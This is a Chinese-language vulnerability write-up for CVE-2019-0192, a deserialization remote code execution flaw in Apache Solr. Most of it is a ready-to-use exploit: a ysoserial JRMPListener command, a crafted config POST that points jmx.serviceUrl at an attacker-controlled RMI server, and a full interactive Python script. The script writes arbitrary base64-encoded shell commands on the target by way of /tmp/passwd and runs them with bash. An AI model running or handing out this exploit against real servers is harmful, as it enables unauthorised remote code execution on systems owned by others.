<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>（CVE-2019-0192）Apache Solr Deserialization 远程代码执行漏洞</h1><h2>一、漏洞简介</h2><p>Apache Solr中的ConfigAPI允许设置一个jmx.serviceUrl，它将创建一个新的JMXConnectorServerFactory，并通过“绑定”操作触发对目标RMI/LDAP服务器的调用。恶意的RMI服务器可以响应任意的对象，这些对象将在Solr端使用java的ObjectInputStream反序列化，这被认为是不安全的。这种类型的漏洞可以利用ysoserial工具。根据目标类路径，攻击者可以使用其中一个“gadget chain”来触发Solr端上的远程代码执行。</p><h2>二、漏洞影响</h2><p>Apache Solr 5.0.0 to 5.5.5</p><p>Apache Solr 6.0.0 to 6.6.5</p><h2>三、复现过程</h2><p>下载Apache Solr 5.5.3版本作为靶机（注意，一定要使用jre7u25以下jre），执行<strong>solr -e techproducts -Dcom.sun.management.jmxremote</strong>指令开启服务。</p><p>使用ysoserial工具，执行<em>Java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 12363 Jdk7u21 "calc"</em><em><strong>指令，监听</strong></em><em>12363</em>**端口。然后传入以下数据：</p><p>POST /solr/techproducts/config HTTP/1.1<br /><br />Host: 0-sec.org:8983<br /><br />User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0<br /><br />Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br /><br />Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br /><br />Content-type:application/json<br /><br />Connection: close<br /><br />Upgrade-Insecure-Requests: 1<br /><br />Content-Length: 91<br /><br /> <br /><br />{"set-property" : {"jmx.serviceUrl" : "service:jmx:rmi:///jndi/rmi://127.0.0.1:12363/obj"}}</p><h3>poc</h3><p>下载<a href="http://wiki.0-sec.org/download/yoserial.zip">yoserial</a>,并将value修改为一下内容</p><p>remote = "http://172.18.0.5:8983"<br />ressource = ""<br />RHOST = "172.18.0.1"<br />RPORT = "1099"</p><p>然后执行一下脚本</p><p>import base64<br />import requests<br />import subprocess<br />import signal<br />import sys<br />import os<br />import time<br />import re<br /><br />remote = "http://172.18.0.5:8983"<br />ressource = ""<br />RHOST = "172.18.0.1"<br />RPORT = "1099"<br /><br />proxy = {<br />}<br /><br />def exploit(command):<br />    print("\n Run the malicious RMI server using yoserial by running this command:")<br />    print("\n java -cp ysoserial-master-ff59523eb6-1.jar ysoserial.exploit.JRMPListener " + RPORT + " Jdk7u21" + command)<br />    <br /><br />if __name__ == "__main__":<br />    print("\nCVE-2019-0192 - Apache Solr RCE 5.0.0 to 5.5.5 and 6.0.0 to 6.6.5\n")<br />    print(&quot;[+] Checking if ressource available =&gt;&quot;, end=' ')<br /><br />    burp0_url = remote + "/solr/admin/cores?wt=json"<br />    r = requests.get(burp0_url, proxies=proxy, verify=False, allow_redirects=False)<br />    if r.status_code == 200:<br />        if r.json()['status'] == &quot;&quot;:<br />            print("KO")<br />            sys.exit()<br />        else:<br />            a = list(r.json()['status'].keys())<br />            ressource = "/solr/" + a[0] + "/config"<br />            print(ressource)<br />    else:<br />        print("KO")<br />        sys.exit()<br /><br />    while True:<br />        try:<br />            command = input("command (\033[92mnot reflected\033[0m)&gt; ")<br />            if command == "exit":<br />                print("Exiting...")<br />                break<br />            command = base64.b64encode(command.encode('utf-8'))<br />            command_str = command.decode('utf-8')<br />            command_str = command_str.replace('/', '+')<br /><br />            pro = subprocess.Popen(<br />                &quot;java -cp ysoserial-master-ff59523eb6-1.jar ysoserial.exploit.JRMPListener &quot; + RPORT + &quot; Jdk7u21 'cp /etc/passwd /tmp/passwd'&quot;, stdout=subprocess.PIPE,shell=True, preexec_fn=os.setsid)<br /><br />            print(&quot;[+] Copy file to tmp directory =&gt;&quot;, end=' ')<br />            burp0_url = remote + ressource<br />            burp0_headers = {"Content-Type": "application/json"}<br />            burp0_json = {<br />                "set-property": {"jmx.serviceUrl": "service:jmx:rmi:///jndi/rmi://" + RHOST + ":" + RPORT + "/obj"}}<br />            r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json)<br />            if r.status_code == 500:<br />                m = re.search('(undeclared checked exception; nested exception is)', r.text)<br />                if m:<br />                    print("\033[92mOK\033[0m")<br />                else:<br />                    print("\n[-] Error")<br />                    os.killpg(os.getpgid(pro.pid), signal.SIGTERM)<br />                    sys.exit()<br />            else:<br />                print("KO")<br />                os.killpg(os.getpgid(pro.pid), signal.SIGTERM)<br />                sys.exit()<br />            os.killpg(os.getpgid(pro.pid), signal.SIGTERM)<br />            time.sleep(3)<br /><br />            pro = subprocess.Popen(<br />                &quot;java -cp ysoserial-master-ff59523eb6-1.jar ysoserial.exploit.JRMPListener &quot; + RPORT + &quot; Jdk7u21 'sed -i 1cpwn /tmp/passwd'&quot;, stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid)<br /><br />            print(&quot;[+] Preparing file =&gt;&quot;, end=' ')<br />            burp0_url = remote + ressource<br />            burp0_headers = {"Content-Type": "application/json"}<br />            burp0_json = {<br />                "set-property": {"jmx.serviceUrl": "service:jmx:rmi:///jndi/rmi://" + RHOST + ":" + RPORT + "/obj"}}<br />            r = requests.post(<br />                burp0_url, headers=burp0_headers, json=burp0_json)<br />            if r.status_code == 500:<br />                print("\033[92mOK\033[0m")<br />            else:<br />                print("KO")<br />                os.killpg(os.getpgid(pro.pid), signal.SIGTERM)<br />                sys.exit()<br />            os.killpg(os.getpgid(pro.pid), signal.SIGTERM)<br />            time.sleep(3)<br /><br />            pro = subprocess.Popen(<br />                &quot;java -cp ysoserial-master-ff59523eb6-1.jar ysoserial.exploit.JRMPListener &quot; + RPORT + &quot; Jdk7u21 'sed -i /[^pwn]/d /tmp/passwd'&quot;, stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid)<br /><br />            print(&quot;[+] Cleaning temp file =&gt;&quot;, end=' ')<br />            burp0_url = remote + ressource<br />            burp0_headers = {"Content-Type": "application/json"}<br />            burp0_json = {<br />                "set-property": {"jmx.serviceUrl": "service:jmx:rmi:///jndi/rmi://" + RHOST + ":" + RPORT + "/obj"}}<br />            r = requests.post(<br />                burp0_url, headers=burp0_headers, json=burp0_json)<br />            if r.status_code == 500:<br />                print("\033[92mOK\033[0m")<br />            else:<br />                print("KO")<br />                os.killpg(os.getpgid(pro.pid), signal.SIGTERM)<br />                sys.exit()<br />            os.killpg(os.getpgid(pro.pid), signal.SIGTERM)<br />            time.sleep(3)<br /><br />            pro = subprocess.Popen(<br />                &quot;java -cp ysoserial-master-ff59523eb6-1.jar ysoserial.exploit.JRMPListener &quot; + RPORT + &quot; Jdk7u21 'sed -i 1s/pwn/{echo,&quot; +<br />                command_str + &quot;}|{base64,-d}&gt;pwn.txt/g /tmp/passwd'&quot;, stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid)<br /><br />            print(&quot;[+] Writing command into temp file =&gt;&quot;, end=' ')<br />            burp0_url = remote + ressource<br />            burp0_headers = {"Content-Type": "application/json"}<br />            burp0_json = {<br />                "set-property": {"jmx.serviceUrl": "service:jmx:rmi:///jndi/rmi://" + RHOST + ":" + RPORT + "/obj"}}<br />            r = requests.post(<br />                burp0_url, headers=burp0_headers, json=burp0_json)<br />            if r.status_code == 500:<br />                print("\033[92mOK\033[0m")<br />            else:<br />                print("KO")<br />                os.killpg(os.getpgid(pro.pid), signal.SIGTERM)<br />                sys.exit()<br />            os.killpg(os.getpgid(pro.pid), signal.SIGTERM)<br />            time.sleep(3)<br /><br />            pro = subprocess.Popen(<br />                &quot;java -cp ysoserial-master-ff59523eb6-1.jar ysoserial.exploit.JRMPListener &quot; + RPORT + &quot; Jdk7u21 'bash /tmp/passwd'&quot;, stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid)<br /><br />            print(&quot;[+] Decode base64 command =&gt;&quot;, end=' ')<br />            burp0_url = remote + ressource<br />            burp0_headers = {"Content-Type": "application/json"}<br />            burp0_json = {<br />                "set-property": {"jmx.serviceUrl": "service:jmx:rmi:///jndi/rmi://" + RHOST + ":" + RPORT + "/obj"}}<br />            r = requests.post(<br />                burp0_url, headers=burp0_headers, json=burp0_json)<br />            if r.status_code == 500:<br />                print("\033[92mOK\033[0m")<br />            else:<br />                print("KO")<br />                os.killpg(os.getpgid(pro.pid), signal.SIGTERM)<br />                sys.exit()<br />            os.killpg(os.getpgid(pro.pid), signal.SIGTERM)<br />            time.sleep(3)<br /><br />            pro = subprocess.Popen(<br />                &quot;java -cp ysoserial-master-ff59523eb6-1.jar ysoserial.exploit.JRMPListener &quot; + RPORT + &quot; Jdk7u21 'bash pwn.txt'&quot;, stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid)<br /><br />            print(&quot;[+] Executing command =&gt;&quot;, end=' ')<br />            burp0_url = remote + ressource<br />            burp0_headers = {"Content-Type": "application/json"}<br />            burp0_json = {<br />                "set-property": {"jmx.serviceUrl": "service:jmx:rmi:///jndi/rmi://" + RHOST + ":" + RPORT + "/obj"}}<br />            r = requests.post(<br />                burp0_url, headers=burp0_headers, json=burp0_json)<br />            if r.status_code == 500:<br />                print("\033[92mOK\033[0m")<br />            else:<br />                print("KO")<br />                os.killpg(os.getpgid(pro.pid), signal.SIGTERM)<br />                sys.exit()<br />            os.killpg(os.getpgid(pro.pid), signal.SIGTERM)<br />            time.sleep(3)<br /><br />        except KeyboardInterrupt:<br />            print("Exiting...")<br />            break</p><h2>参考链接</h2><p>https://github.com/mpgn/CVE-2019-0192</p><p>https://mp.weixin.qq.com/s?__biz=MzI4NjE2NjgxMQ==&amp;mid=2650237094&amp;idx=1&amp;sn=4125bf632680d991f38f9f147657b38d&amp;chksm=f3e2d2d2c4955bc4894b3098ca11cbe7d9917c23e173c87b7fe2f02c84b195aea381746567a3&amp;scene=21#wechat_redirect</p></body></html>